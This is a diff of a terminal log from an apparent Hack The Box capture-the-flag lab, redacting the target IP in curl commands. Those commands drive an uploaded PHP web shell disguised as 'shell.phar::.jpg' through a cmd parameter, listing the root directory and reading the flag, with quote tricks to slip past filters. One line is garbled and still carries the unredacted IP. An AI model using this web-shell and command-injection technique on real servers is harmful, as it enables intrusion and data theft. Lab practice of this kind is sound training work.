@@ -1,5 +1,5 @@
 ┌──(redacted㉿redacted-[~/Desktop]
-└─$ curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=ls+/+-la"
+└─$ curl "http://redacted:port/profile_images/shell.phar::.jpg?cmd=ls+/+-la"
 total 68
 drwxr-xr-x   1 root root 4096 May  4 09:18 .
 drwxr-xr-x   1 root root 4096 May  4 09:18 ..
@@ -27,18 +27,18 @@ drwxr-xr-x   1 root root 4096 Jul 20  2020 usr
 drwxr-xr-x   1 root root 4096 Aug 19  2020 var
                                                                                                                                                                                                                                                                                                                            
 ┌──(redacted)-[~/Desktop]
-└─$ curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=cat+/+-flag.txt"
+└─$ curl "http://redacted/profile_images/shell.phar::.jpg?cmd=cat+/+-flag.txt"
                                                                                                                                                                                                                                                                                                                            
 ┌──(redacted)-[~/Desktop]
-└─$ curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=c"a"t+/+-flag.txt"
+└─$ curl "http://redacted/profile_images/shell.phar::.jpg?cmd=c"a"t+/+-flag.txt"
                                                                                                                                                                                                                                                                                                                            
 ┌──(redacted)-[~/Desktop]
 └─$ 
                                                                                                                                                                                                                                                                                                                            
 ┌──(eredacted)-[~/Desktop]
-└─$ curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=c"a"tcurl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=ls+/+-la"+/+-flag.txt"
+└─$ curl "http://redactedprofile_images/shell.phar::.jpg?cmd=c"a"tcurl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=ls+/+-la"+/+-flag.txt"
                                                                                                                                                             
 ┌──(redacted-[~/Desktop]
-└─$ curl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=cat+/flag.txt"
+└─$ curl "http://redacted/profile_images/shell.phar::.jpg?cmd=cat+/flag.txt"
 HTB{redacted}
 
